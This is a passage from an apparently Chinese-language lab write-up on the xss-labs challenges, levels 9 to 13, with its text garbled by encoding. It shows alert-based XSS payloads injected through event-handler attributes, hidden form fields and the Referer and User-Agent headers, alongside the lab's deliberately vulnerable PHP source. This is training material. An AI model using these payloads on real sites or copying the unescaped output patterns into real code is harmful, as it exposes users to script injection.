class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))    <span class="comment">//åˆ¤æ–­å˜é‡å€¼æ˜¯å¦å­˜åœ¨å­—ä¸² â€˜http://â€™</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;  <span class="comment">//å­˜åœ¨åˆ™ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>ç±»å‹: urlç±»å‹</p>
<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>è¾“å…¥ä¸€äº›æµ‹è¯•è¯­å¥ï¼ˆ<script>alert(&#39;123&#39;);</script>ï¼‰</p>
<p>ä½†å›æ˜¾ç»“æœç±»ä¼¼äºï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_35.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>æ’å…¥çš„è¯­å¥è¢«å®ä¾‹åŒ–ï¼Œä¸”æ— æ³•å‡†ç¡®æœ‰æ•ˆåœ°åˆ¤æ–­è¿‡æ»¤ç‰¹å¾æˆ–è§¦å‘çš„è¡Œä¸ºç»“æœâ€“&gt;å¯èƒ½å°±ä¸æ˜¯è¿™ä¸ªå‚æ•°ï¼ˆkeyword&#x3D;ï¼‰</li>
</ul>
<h3 id="éšè—æ ‡ç­¾"><a href="#éšè—æ ‡ç­¾" class="headerlink" title="*éšè—æ ‡ç­¾"></a>*éšè—æ ‡ç­¾</h3><blockquote>
<p>1.ä¸€äº›ç½‘ç«™çš„åç«¯å¯ä»¥æ¥å—éšè—çš„inputæ ‡ç­¾çš„å‚æ•°<br>2.éšè—inputæ ‡ç­¾çš„ç›®çš„æ˜¯ï¼šåç«¯éœ€è¦inputçš„è¿”å›å€¼ï¼Œä½†æœ‰ä¸æƒ³ç”¨æˆ·çœ‹è§â€”&gt;è¿™ç§æƒ…å†µç»å¸¸å‡ºç°<br>3.hiddenä¸‹çš„inputæ ‡ç­¾çš„èµ‹å€¼å¾€å¾€æ˜¯é€šè¿‡jsä»£ç çš„é€»è¾‘è¿›è¡Œèµ‹å€¼ï¼Œä¹Ÿå­˜åœ¨é€šè¿‡postï¼Œgetè¯·æ±‚è·å–å€¼</p>
</blockquote>
<ul>
<li>ä¸å‰é¢å…³å¡ä¸åŒçš„æ˜¯ï¼šæœ‰å¤§é‡éšè—çš„inputæ ‡ç­¾ï¼ˆhiddenï¼‰</li>
</ul>
<p>æµ‹è¯•ä½¿ç”¨getè¯·æ±‚å¯¹éšè—çš„inputæ ‡ç­¾èµ‹å€¼ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(%27123%27);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&amp;t_link=123&amp;t_history=456&amp;t_sort=789</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ç»“æœï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_36.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æ€»å…±æœ‰å››ä¸ªé”®å€¼å¯¹ï¼Œæ¢æµ‹å‡ºç¬¬å››ä¸ªé”®å€¼å¯¹å¯èƒ½å­˜åœ¨xss</p>
<p>è¾“å…¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_37.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>é”®å€¼å¯¹ä»¥&amp;åˆ†å‰²ï¼Œä¸ç”¨æ‹…å¿ƒkeywordå°†åé¢çš„è¯­å¥å½“ä½œå€¼</p>
<p>å›æ˜¾ç»“æœï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_38.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>å›æ˜¾çš„ç»“æœä¸ç¬¬å››å…³ç±»ä¼¼</li>
</ul>
<p>è¾“å…¥è¯­å¥ï¼šï¼ˆæ’å±æ€§ï¼‰</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br><span class="line">onclick éœ€è¦è‡ªä¸»ç‚¹å‡»ï¼Œæ‰€ä»¥éœ€è¦â€™æ˜¾ç¤ºâ€˜</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_39.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<p>é¡µé¢æ¸²æŸ“ï¼šï¼ˆå¤šäº†ä¸€ä¸ªè¾“å…¥æ–‡æœ¬æ¡†ï¼‰</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_40.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>ç‚¹å‡»å³å¯é€šå…³</p>
<h3 id="è¶£äº‹-1"><a href="#è¶£äº‹-1" class="headerlink" title="*è¶£äº‹"></a>*è¶£äº‹</h3><p>â€”â€“&gt;æœ‰è¶£çš„æ˜¯å°†æ‹¬å·é‡Œé¢çš„åŒå¼•å·æ”¹ä¸ºå•å¼•å·å°±æ— æ³•æˆåŠŸæ’å…¥<br>å³è¾“å…¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&#x27;123&#x27;)&#x27; type=&#x27;text&#x27;  //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_41.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<blockquote>
<p>åˆ†æï¼š onclick&#x3D;â€™alert(â€˜123â€™)â€™<br>1.æµè§ˆå™¨å°† å‰ä¸¤ä¸ªå•å¼•å·çœ‹ä½œä¸€ç»„å³â€™alert(â€˜   â€“&gt;è½¬ä¸ºåŒèµ¢å·ï¼Œå³â€alert(â€œ    ï¼ˆæ ‡ç­¾å±æ€§åé¢æµè§ˆå™¨éƒ½ä¼šå•å¼•å·è½¬ä¸ºåŒå¼•å·ï¼‰<br>2.å¯¹äºå‰©ä¸‹çš„ â€˜)â€™  ï¼Œä¸æ˜¯ä»»ä½•å±æ€§çš„å€¼ï¼Œä¸å°†å•å¼•å·è½¬ä¸ºåŒå¼•å·ï¼Œè¢«å½“ä½œå±æ€§æˆ–æ ‡ç­¾å‘ˆç°è“è‰²</p>
</blockquote>
<ul>
<li>ç»éªŒæ€»ç»“ï¼šä½¿ç”¨å¤šä¸ªç›¸åŒçš„å¼•å·è¦æ³¨æ„æµè§ˆçš„è¯†åˆ«è§„åˆ™</li>
</ul>
<p>è¡¥å……ï¼šè‡ªåŠ¨ç‚¹å‡»æµ‹è¯•</p>
<p>è¾“å…¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text &#x27; autofocus&quot;    </span><br><span class="line">autofocusæ˜¯ç‹¬ç«‹å±æ€§</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_42.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æ²¡æœ‰è‡ªåŠ¨ç‚¹å‡»ï¼ˆï¼‰åŸå› æ˜¯å°¾éƒ¨å­˜åœ¨åŒå¼•å·â€“&gt;è¯­æ³•é”™è¯¯</p>
<p>æµ‹è¯•ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27;  autofocus //</span><br><span class="line">å®ä¸ºï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">&#x27;alert(123)&#x27;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; autofocus type=&#x27;text&#x27; </span><br><span class="line">å®ä¸ºï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">&#x27;alert(123)&#x27;</span> <span class="attr">autofocus</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å®ç°è‡ªåŠ¨ç‚¹å‡»</p>
<p>å› æ­¤ï¼Œæ³¨å…¥çš„è¯­å¥æœ€ååœ¨å°¾éƒ¨åŠ æ³¨é‡Šï¼ˆå…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼‰</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level10&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];  <span class="comment">// æ¥å—t_sortçš„å‚æ•° </span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;   </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>ç±»å‹ï¼šurlç±»å‹</p>
<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>æ²¡æœ‰è¾“å…¥ä»»ä½•è¯­å¥ï¼Œæ£€æŸ¥é¡µé¢ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_43.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">


<ul>
<li>åŒ…å«å¤šä¸ªéšè—æ ‡ç­¾</li>
<li>å…¶ä¸­ä¸€ä¸ªinputæ ‡ç­¾å­˜åœ¨å€¼ï¼Œæ˜¯ä¸Šä¸€å…³æ³¨å…¥çš„payload</li>
</ul>
<p>åˆ é™¤level11å…³é¡µé¢åï¼Œç”¨ç›®å½•é¡µé¢è®¿é—®level11å…³ï¼Œå›æ˜¾ç»“æœä¸ºï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_44.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>åˆ†æå¾—å‡ºï¼Œt_refçš„å€¼è®°å½•çš„æ˜¯ä»ä¸ªç½‘å€è®¿é—®çš„</li>
<li>å¯ä»¥æ¨æ–­å‡ºï¼Œåç«¯å°†æ•°æ®åŒ…ä¸­refereræ çš„åœ°å€æ‹¼æ¥åˆ°value</li>
</ul>
<h3 id="Referer"><a href="#Referer" class="headerlink" title="*Referer"></a>*Referer</h3><p>åˆ·æ–°é¡µé¢ï¼ŒæŠ“å–æ•°æ®åŒ…ï¼šä¿®æ”¹æ•°æ®åŒ…ä¸­çš„Refererï¼Œå³å¯å®Œæˆpayloadæ³¨å…¥</p>
<p>ä¿®æ”¹ä¸ºï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_45.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>é¡µé¢æ¸²æŸ“ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_46.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>ç‚¹å‡»å³å¯é€šå…³</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]; <span class="comment">//è·å–Referer </span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);  <span class="comment">//è¿™é‡Œè¿›è¡Œæ›¿æ¢ï¼Œå¯ä»¥é€‰æ‹©æ’å…¥å±æ€§</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>ç±»å‹ï¼š urlç±»å‹</p>
<p>ä¸11å…³ç±»ä¼¼ï¼Œä¸å†è¿‡å¤šæ¼”ç¤º</p>
<h3 id="HTTP-USER-AGENT"><a href="#HTTP-USER-AGENT" class="headerlink" title="*HTTP_USER_AGENT"></a>*HTTP_USER_AGENT</h3><img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_47.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>ä¿®æ”¹ä¸ºï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //  </span><br><span class="line">ä¸Šè¿°è¯­å¥å¤±è´¥-æ‹¼æ¥valueå‰åŒå¼•å·è¢«å®ä¾‹åŒ–è½¬ä¹‰</span><br><span class="line">ç»§ç»­ä¿®æ”¹ï¼š</span><br><span class="line">&quot; onclick=alert(&#x27;123&#x27;) type=&#x27;text&#x27; //  </span><br><span class="line">æˆåŠŸç»•è¿‡   </span><br><span class="line">ç»†èŠ‚ï¼šé˜²æ­¢è¯†åˆ«é”™è¯¯ï¼Œé™¤å»alertä¸¤ä¾§çš„å•å¼•å·</span><br></pre></td></tr></table></figure>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level13.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level12&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];  <span class="comment">//è·å–ä»£ç†ä¿¡æ¯</span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>; </span><br><span class="line"><span class="comment">//è½¬ä¹‰åå†æ‹¼æ¥</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>ç±»å‹ï¼šéšè—æ ‡ç­¾</p>
<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>æ¢æµ‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">keyword=1&amp;t_link=2&amp;t_history=3&amp;t_sort=4&amp;t_cook=5</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_48.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æµ‹è¯•t_sort</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾ï¼š</p>
